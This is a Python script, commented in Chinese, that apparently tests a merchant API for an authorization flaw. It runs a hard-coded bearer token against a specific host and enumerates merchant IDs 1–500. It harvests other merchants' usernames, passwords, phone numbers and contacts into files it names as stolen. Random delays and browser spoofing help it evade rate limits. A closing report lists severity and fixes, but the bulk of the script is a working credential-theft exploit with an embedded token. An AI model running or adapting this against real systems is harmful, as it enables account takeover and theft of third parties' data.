import requests
import json
from datetime import datetime
import time
import random

# 商戶 Token（請替換成你的商戶 Token）
BRAND_TOKEN = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwczovL3dwYXBpLmxkanptci50b3AvYWRtaW4vbG9naW4iLCJpYXQiOjE3NzEwNjY3NzUsImV4cCI6MTgwMjYwMjc3NSwibmJmIjoxNzcxMDY2Nzc1LCJqdGkiOiJ5SnpaRXZIeG9kQ3VjV2g5Iiwic3ViIjoiOTk5IiwicHJ2IjoiNzIzNDlhZmZkYTA0NGRjMmFkNzBhMzllZjE1MTYzZWE2N2E3MzMxMyJ9.6YPANh5fbTF5ZX5YJgzIbJ-RXas7MoxkM485G-y2tGQ"

BASE_URL = "https://wpapi.ldjzmr.top"

headers = {
    "Authorization": f"Bearer {BRAND_TOKEN}",
    "Content-Type": "application/json",
    "Accept": "application/json, text/plain, */*",
    "Accept-Language": "zh-TW,zh;q=0.9",
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Referer": "https://wpbrand.ldjzmr.top/"
}

all_brands = []

print("="*120)
print("🔥 商戶越權測試：竊取其他商戶帳號密碼")
print("="*120)
print(f"測試時間: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
print(f"使用角色: 商戶")
print(f"目標: 測試能否訪問其他商戶的資料")
print("="*120 + "\n")

print("策略:")
print("  ⏱️  每次請求間隔 2-4 秒")
print("  🎭 完整偽裝瀏覽器")
print("  📉 單線程")
print("  ⏸️  每 50 個休息 60 秒")
print("  💾 即時保存進度")
print(f"  ⏰ 預估時間: 約 35 分鐘\n")

# ============================================================================
# 掃描並竊取商戶帳號
# ============================================================================
print("="*120)
print("📍 開始掃描 brand_id 1-500")
print("-"*120 + "\n")

target_range = range(1, 501)
total_count = len(target_range)

start_time = time.time()

for idx, brand_id in enumerate(target_range, 1):
    # 隨機延遲
    delay = random.uniform(2.0, 4.0)
    
    print(f"[{datetime.now().strftime('%H:%M:%S')}] ", end='')
    print(f"商戶 {brand_id:4}...", end='')
    print(f" ({delay:.1f}s)", end='', flush=True)
    
    time.sleep(delay)
    
    try:
        # 嘗試訪問其他商戶的資料
        response = requests.get(
            f"{BASE_URL}/brand/brand/{brand_id}",  # 商戶可能用這個路徑
            headers=headers,
            timeout=15
        )
        
        # 如果上面的路徑不行，可以嘗試其他路徑
        if response.status_code == 404:
            # 嘗試其他可能的路徑
            alternative_paths = [
                f"/agent/brand/{brand_id}",
                f"/merchant/brand/{brand_id}",
            ]
            
            for alt_path in alternative_paths:
                response = requests.get(
                    f"{BASE_URL}{alt_path}",
                    headers=headers,
                    timeout=15
                )
                if response.status_code == 200:
                    break
        
        if response.status_code == 429:
            print(f" ⚠️  限流！")
            wait = random.uniform(120, 180)
            print(f"    休息 {wait/60:.1f} 分鐘...")
            time.sleep(wait)
            continue
        
        if response.status_code == 200:
            data = response.json()
            
            if data.get('code') == 0 and 'data' in data:
                brand_data = data['data']
                
                brand_info = {
                    'brand_id': brand_id,
                    'brand_name': brand_data.get('name', 'N/A'),
                    'username': brand_data.get('username', 'N/A'),
                    'machine_password': brand_data.get('machine_password', 'N/A'),
                    'agent_id': brand_data.get('agent_id', 'N/A'),
                    'phone': brand_data.get('phone', 'N/A'),
                    'contacts': brand_data.get('contacts', 'N/A'),
                    'status': brand_data.get('status', 'N/A'),
                }
                
                all_brands.append(brand_info)
                
                has_pwd = "🔑" if brand_info['machine_password'] != 'N/A' else "⚪"
                print(f" {has_pwd} 🚨 {brand_info['brand_name']:15} | 帳號:{brand_info['username']:15}")
            else:
                print(f" ✗ code={data.get('code')}")
        elif response.status_code == 403:
            print(f" 🔒 禁止訪問（有權限保護）")
        elif response.status_code == 401:
            print(f" 🔒 未授權（有權限保護）")
        else:
            print(f" ✗ {response.status_code}")
    
    except Exception as e:
        print(f" ✗ 錯誤")
    
    # 每 50 個休息
    if idx % 50 == 0:
        progress = idx / total_count * 100
        print()
        print(f"{'='*120}")
        print(f"進度: {idx}/{total_count} ({progress:.1f}%)")
        print(f"已竊取: {len(all_brands)} 個商戶帳號")
        
        # 保存進度
        progress_file = f"progress_brand_{datetime.now().strftime('%H%M%S')}.json"
        with open(progress_file, 'w', encoding='utf-8') as f:
            json.dump({
                'completed': idx,
                'total': total_count,
                'brands': all_brands
            }, f, ensure_ascii=False, indent=2)
        
        print(f"進度已保存: {progress_file}")
        
        rest = random.uniform(45, 60)
        print(f"休息 {rest:.0f} 秒...")
        print(f"{'='*120}\n")
        
        time.sleep(rest)

scan_duration = (time.time() - start_time) / 60

# ============================================================================
# 統計結果
# ============================================================================
print("\n" + "="*120)
print("📊 竊取結果統計")
print("="*120 + "\n")

brands_with_password = [b for b in all_brands if b['machine_password'] != 'N/A']

print(f"掃描範圍: brand_id 1-500")
print(f"掃描耗時: {scan_duration:.1f} 分鐘")
print(f"\n總共竊取: {len(all_brands)} 個商戶帳號")
print(f"有密碼的: {len(brands_with_password)} 個")
print(f"成功率: {len(all_brands)/500*100:.1f}%\n")

# ============================================================================
# 保存報告
# ============================================================================
print("="*120)
print("📍 保存竊取的資料")
print("-"*120 + "\n")

if all_brands:
    # JSON 報告
    json_file = f"brand_stolen_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    with open(json_file, 'w', encoding='utf-8') as f:
        json.dump({
            "scan_time": datetime.now().isoformat(),
            "role": "商戶",
            "scan_range": "brand_id 1-500",
            "scan_duration_minutes": scan_duration,
            "summary": {
                "total_stolen": len(all_brands),
                "with_password": len(brands_with_password),
                "success_rate": f"{len(all_brands)/500*100:.1f}%"
            },
            "brands": all_brands
        }, f, ensure_ascii=False, indent=2)
    
    print(f"✓ JSON 報告: {json_file}")
    
    # CSV 報告
    csv_file = f"brand_stolen_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv"
    with open(csv_file, 'w', encoding='utf-8') as f:
        f.write("商戶ID,商戶名稱,帳號,密碼,代理ID,電話,聯絡人,狀態\n")
        for brand in all_brands:
            f.write(f"{brand['brand_id']},{brand['brand_name']},{brand['username']},{brand['machine_password']},{brand['agent_id']},{brand['phone']},{brand['contacts']},{brand['status']}\n")
    
    print(f"✓ CSV 報告: {csv_file}\n")
    
    # 顯示前 20 個竊取的帳號
    print("="*120)
    print("🚨 竊取的商戶帳號（前 20 個）")
    print("="*120 + "\n")
    
    print(f"{'序號':<5} {'商戶ID':<8} {'商戶名稱':<20} {'帳號':<20} {'密碼':<15} {'狀態'}")
    print("-"*120)
    
    for i, brand in enumerate(all_brands[:20], 1):
        has_pwd = "🔑" if brand['machine_password'] != 'N/A' else "⚪"
        print(f"{i:<5} {brand['brand_id']:<8} {brand['brand_name']:<20} {brand['username']:<20} {brand['machine_password']:<15} {has_pwd}")
    
    if len(all_brands) > 20:
        print(f"\n...還有 {len(all_brands)-20} 個")
    
    print()

else:
    print("✓ 沒有竊取到任何商戶資料")
    print("✓ 系統有權限保護，商戶無法訪問其他商戶的資料\n")

# ============================================================================
# 最終報告
# ============================================================================
print("="*120)
print("🔥 最終安全報告")
print("="*120)

if all_brands:
    print(f"""
漏洞等級: 🔴🔴🔴 極度危險

竊取統計:
  - 掃描範圍: brand_id 1-500
  - 總竊取數: {len(all_brands)} 個商戶
  - 含密碼的: {len(brands_with_password)} 個
  - 竊取成功率: {len(all_brands)/500*100:.1f}%
  - 耗時: {scan_duration:.1f} 分鐘

嚴重性:
  🔴 商戶可以竊取其他商戶的帳號
  🔴 商戶可以竊取其他商戶的密碼
  🔴 可以直接登入其他商戶的系統
  🔴 完全沒有權限檢查
  🔴 多租戶隔離完全失效

影響範圍:
  ✗ 所有商戶帳號密碼洩露
  ✗ 可能的帳號劫持
  ✗ 資料竊取和破壞
  ✗ 嚴重的法律責任

證據文件:
  - JSON 完整報告: {json_file}
  - CSV 表格報告: {csv_file}

緊急建議:
  🔴 立即修復 API 權限檢查
  🔴 添加資源所有權驗證
  🔴 強制所有商戶更改密碼
  🔴 審計歷史訪問記錄
  🔴 通知所有受影響的商戶
  🔴 評估法律責任
""")
else:
    print(f"""
安全等級: 🟢 安全

測試結果:
  ✓ 商戶無法訪問其他商戶的資料
  ✓ 系統有正確的權限檢查
  ✓ 多租戶隔離正常運作

掃描統計:
  - 掃描範圍: brand_id 1-500
  - 竊取成功: 0 個
  - 耗時: {scan_duration:.1f} 分鐘

結論:
  系統在商戶層級有正確的權限控制
  商戶無法越權訪問其他商戶的資料
""")

print("="*120)
print("測試完成！")
print("="*120)